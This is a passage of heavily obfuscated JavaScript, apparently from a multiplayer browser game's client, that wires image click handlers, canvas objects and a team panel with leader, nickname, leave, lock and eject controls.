				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(9)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_11")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(10)
			}), ⲆΔᐃⲆΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_12")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(11)
			}), ᐃᐃΔᐃΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_13")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(12)
			}), ᐃⵠΔⵠⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_14")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(13)
			}), ⵠᐃΔΔⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_15")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(ⵠⲆΔᐃᐃ)
			}), ΔΔⵠⲆΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_16")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(15)
			}), ⲆΔⵠⲆΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_17")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(16)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_18")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(17)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_19")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(18)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_20")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(ᐃⲆΔⲆᐃⲆᐃ)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_21")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(20)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_22")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(21)
			}), ⵠᐃⵠᐃᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_23")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(22)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_24")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(23)
			}), ⲆⵠΔⵠΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_25")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(24)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_26")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(25)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_27")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(26)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_28")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(27)
			}), ⵠᐃⵠᐃᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_29")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(28)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_30")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(29)
			}), ᐃᐃⵠΔⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_31")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(30)
			}), ⲆᐃⵠⲆⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_32")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(31)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_33")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(32)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_34")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(33)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_35")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(34)
			}), ⲆⲆⲆᐃⵠ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_36")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(35)
			}), ⲆΔᐃⲆΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_37")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(36)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_38")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(37)
			}), ᐃᐃΔᐃΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_39")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(38)
			}), ΔᐃᐃⲆⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_40")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(39)
			}), ⲆⲆᐃⵠᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_41")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(40)
			}), ⲆⲆᐃⵠᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_42")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(41)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_43")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(42)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_44")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(43)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_45")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(44)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_46")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(45)
			}), ᐃⲆᐃⵠΔ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_47")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(46)
			}), false);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("img_48")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[419], (function() {
				ΔⵠⵠⲆ.ΔΔΔΔ.list.ⵠⲆΔⵠ(47)
			}), false);
			this.ᐃⵠΔⲆⵠ = {
				translate: {
					x: ΔⲆⵠⲆ,
					y: 0
				},
				"ᐃⲆᐃᐃᐃ": {
					x: -1,
					y: -ⵠⲆΔ
				},
				"ᐃᐃᐃⵠ": [],
				focus: function(ⲆⲆⵠⵠ) {
					var ⲆⵠⲆ = this.translate.y + (ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length > ᐃⵠⲆⵠ ? -120 : -50);
					if (ⲆⲆⵠⵠ.x > this.translate.x && ⲆⲆⵠⵠ.x < this.translate.x + 193 && ⲆⲆⵠⵠ.y > ⲆⵠⲆ && ⲆⲆⵠⵠ.y < ⲆⵠⲆ + 193) {
						this.ᐃⲆᐃᐃᐃ.x = ⲆⲆⵠⵠ.x - this.translate.x;
						this.ᐃⲆᐃᐃᐃ.y = ⲆⲆⵠⵠ.y - ⲆⵠⲆ
					}
				}
			};
			this.ⲆⲆⵠΔᐃ = {
				translate: {
					x: 0,
					y: 0
				},
				"ᐃⵠ": ⵠⲆ[Ⲇ.ⵠⵠᐃⲆΔᐃᐃ],
				"Ⲇⵠ": document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488])
			};
			this.ⲆⲆⵠΔᐃ.Ⲇⵠ.width = this.ⲆⲆⵠΔᐃ.ᐃⵠ.width;
			this.ⲆⲆⵠΔᐃ.Ⲇⵠ.height = this.ⲆⲆⵠΔᐃ.ᐃⵠ.height;
			this.ⲆⲆⵠΔᐃ.Δ = this.ⲆⲆⵠΔᐃ.Ⲇⵠ.getContext(ⵠ[289]);
			this.ⲆΔⲆⵠ = {
				translate: {
					x: ΔΔⵠⵠ,
					y: 0
				},
				"ᐃⵠ": ⵠⲆ[Ⲇ.ⵠⵠⵠⲆᐃᐃΔ],
				"ΔᐃΔⵠ": ⵠᐃⲆⵠⲆΔⲆΔᐃ,
				y: ΔⲆⲆ
			};
			var ⵠΔⲆⵠᐃ = ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[94]][ΔᐃⲆⵠⲆⵠΔ[224]]("div");
			this.ⲆⵠⲆⵠᐃⲆᐃ = function() {
				ⲆⲆᐃⵠⲆ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]);
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div id="leader"><img src="./img/leaderlogo.png" style="width:25px;margin-right:5px;" ></img>' + ((ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.ⲆᐃⵠⲆΔ[0]].ⵠΔⵠⲆᐃ) && ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]]) + "</div";
				for (var ⵠᐃ = 1; ᐃᐃΔ.ⲆᐃⵠⲆΔ.length > ⵠᐃ; ⵠᐃ++) {
					ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div class="nicknames"> <div style="display:inline-block;padding-top:7px;">' + ((ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.ⲆᐃⵠⲆΔ[ⵠᐃ]].ⵠΔⵠⲆᐃ) && ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]]) + "</div></div>"
				}
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div id="leave" style="display:inline-block;">LEAVE</div></div>';
				ⲆⲆᐃⵠⲆ.style.display = ⵠ[35];
				document[ΔᐃⲆⵠⲆⵠΔ[68]]("leave")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], ΔⵠⲆᐃ.ⲆⵠⲆⵠᐃⲆᐃ, false)
			};
			this.ⲆΔⵠᐃᐃΔΔᐃⲆ = function() {
				ⲆⲆᐃⵠⲆ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]);
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div id="leader"><img src="./img/leaderlogo.png" style="width:25px;margin-right:5px;" ></img>' + ((ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.ⲆᐃⵠⲆΔ[0]].ⵠΔⵠⲆᐃ) && ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]]) + "</div";
				for (var ⵠᐃ = 1; ⵠᐃ < ᐃᐃΔ.ⲆᐃⵠⲆΔ.length; ⵠᐃ++) {
					ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div class="nicknames"> <div style="display:inline-block;padding-top:7px;">' + ((ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.ⲆᐃⵠⲆΔ[ⵠᐃ]].ⵠΔⵠⲆᐃ) && ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]]) + "</div></div>"
				}
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += ⵠ[123];
				ⲆⲆᐃⵠⲆ.style.display = ⵠ[35]
			};
			this.ΔΔⲆΔⵠᐃⵠᐃΔ = function() {
				ⲆⲆᐃⵠⲆ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]);
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] = "";
				ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div id="leader"><img src="./img/leaderlogo.png" style="width:25px;margin-right:5px;" ></img>' + ((ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.ⲆᐃⵠⲆΔ[ᐃΔΔ]].ⵠΔⵠⲆᐃ) && ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]]) + "</div";
				for (var ⵠᐃ = 1; ᐃᐃΔ.ⲆᐃⵠⲆΔ.length > ⵠᐃ; ⵠᐃ++) ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div class="nicknames"> <div style="display:inline-block;padding-top:7px;">' + ((ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[285]] = ⲆⲆⲆ.ᐃᐃᐃⵠ[ᐃᐃΔ.ⲆᐃⵠⲆΔ[ⵠᐃ]].ⵠΔⵠⲆᐃ) && ⵠΔⲆⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[290]]) + '</div><div class="eject_member" id="eject_member' + ⵠᐃ + '"><img src="./img/close-team.png" style="width:20px;padding:5px;"></img></div>';
				if (ᐃᐃΔ.ⵠΔΔᐃⵠ.lock === Δᐃᐃⵠ) ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div id="lock_team" style="display:inline-block;">LOCK</div></div>';
				else ⲆⲆᐃⵠⲆ[ΔᐃⲆⵠⲆⵠΔ[290]] += '<div id="lock_team" style="display:inline-block;">UNLOCK</div></div>';
				document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[324])[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], ΔⵠⲆᐃ.ᐃᐃⵠΔΔⲆⵠⵠᐃ, ⲆⲆᐃⵠᐃ);
				ⲆⲆᐃⵠⲆ.style.display = ⵠ[35];
				for (var ⵠᐃ = ⵠΔⵠΔ; ⵠᐃ < ᐃᐃΔ.ⲆᐃⵠⲆΔ.length; ⵠᐃ++) {
					switch (ⵠᐃ) {
						case ΔᐃⲆⵠ:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(1)
							}), false);
							break;
						case ᐃⵠⲆⲆⲆ:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(2)
							}), false);
							break;
						case 3:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(3)
							}), ᐃᐃⵠΔⵠ);
							break;
						case 4:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(ⵠᐃΔΔ)
							}), ⲆΔᐃⲆΔ);
							break;
						case 5:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(5)
							}), ⲆᐃⵠⲆⵠ);
							break;
						case 6:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(Δⵠᐃᐃⵠ)
							}), false);
							break;
						case 7:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(ᐃΔⲆΔᐃ)
							}), false);
							break;
						case 8:
							document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[274] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[316], (function() {
								ΔⵠⲆᐃ.ᐃⵠⲆⲆΔᐃᐃ(ⵠⵠᐃΔⲆ)
							}), false);
							break
					}
				}
			};
			this.ᐃΔⵠΔᐃ = [];
			this.ᐃΔⵠΔᐃ[ᐃⲆⵠᐃᐃ.ⵠᐃⲆⲆᐃⵠⵠ] = {
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ]),
				action: this.ⲆⵠⲆⵠᐃⲆᐃ
			};
			this.ᐃΔⵠΔᐃ[ᐃⲆⵠᐃᐃ.ⵠᐃⲆⵠⲆⵠΔ] = {
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠᐃⵠⵠᐃ]),
				action: ΔⵠⲆᐃ.ΔᐃᐃΔΔΔΔᐃⲆ
			};
			this.ᐃΔⵠΔᐃ[ᐃⲆⵠᐃᐃ.ⲆΔΔⵠᐃⲆΔ] = {
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔⵠⵠ]),
				action: this.ΔΔⲆΔⵠᐃⵠᐃΔ
			};
			this.ᐃΔⵠΔᐃ[ᐃⲆⵠᐃᐃ.ⲆⵠⲆⲆᐃΔⲆ] = {
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃᐃⲆ]),
				action: this.ⲆΔⵠᐃᐃΔΔᐃⲆ
			};
			this.ᐃΔⵠΔᐃ[ᐃⲆⵠᐃᐃ.ⲆⵠⵠᐃⵠⲆΔ] = {
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔᐃΔ]),
				action: function() {}
			};
			this.ΔΔⲆᐃⲆ = -Ⲇᐃⵠ;
			this.ΔⵠⲆᐃΔⲆⵠ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠⲆⲆ]);
			this.ⵠΔᐃⵠⵠⲆⲆ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠⵠⲆ]);
			this.ᐃᐃⵠⵠᐃⵠⵠ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃᐃ]);
			this.ⵠΔᐃΔΔⲆⵠ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃⵠ]);
			this.ⵠΔΔᐃΔⲆᐃ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔΔᐃᐃ]);
			this.ΔΔΔⲆⵠⵠⵠ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ]);
			this.ΔⵠΔΔᐃᐃΔ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔᐃⲆΔΔᐃ]);
			this.ⲆΔⵠᐃⲆᐃⵠ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔΔᐃΔᐃΔ]);
			this.ΔᐃⲆⵠⲆΔᐃ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠᐃⵠ]);
			this.ᐃΔΔᐃⲆⵠⲆ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔⲆΔ]);
			this.ΔⲆⲆΔⵠⵠⲆ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ]);
			this.ΔᐃᐃⵠⲆⵠᐃ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⵠΔⲆⲆΔ]);
			this.ⵠᐃⵠΔᐃⵠⲆ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠΔᐃⲆᐃ]);
			this.ⲆⲆⲆⵠᐃΔΔ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃΔᐃⲆⵠ]);
			this.ΔⲆΔᐃΔⵠᐃ = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃⵠΔ]);
			this.ⵠᐃΔΔⲆ = Δⵠⵠ(120, 120, "", ⵠⲆ[Ⲇ.ⵠΔⲆⲆᐃ]);
			this.ⵠᐃΔΔⲆ.info.translate.x = ⲆⵠⲆⵠⲆ;
			this.ⵠᐃΔΔⲆ.info.translate.y = 10;
			this.ⵠⵠΔ = [];
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔᐃⵠΔΔⵠ], ⵠⵠⵠᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ].id = ᐃᐃ.ⲆᐃⵠΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔⲆᐃⲆᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ].id = ᐃᐃ.ⲆⵠᐃⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⵠΔⲆΔΔ], Δⵠᐃⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⲆ].id = ᐃᐃ.ᐃᐃΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⲆᐃΔⵠᐃ], ᐃᐃⲆⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ].id = ᐃᐃ.ⵠⲆⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃⵠᐃ], ⲆⲆΔⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ].id = ᐃᐃ.ⵠⲆΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔᐃΔ].id = ᐃᐃ.ⵠᐃΔᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆᐃΔ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠⵠ].id = ᐃᐃ.ΔⲆⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃΔ].id = ᐃᐃ.ΔⲆᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠᐃⵠΔⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ].id = ᐃᐃ.ΔΔⲆⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠᐃⲆⲆⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ].id = ᐃᐃ.ⵠⲆⲆΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃΔᐃΔⵠⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ].id = ᐃᐃ.ⵠᐃⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔΔᐃⵠⵠᐃ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ].id = ᐃᐃ.ΔΔⵠᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆⲆᐃΔΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ].id = ᐃᐃ.ᐃΔⵠᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆⵠΔ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ].id = ᐃᐃ.ⵠⲆΔᐃΔ;
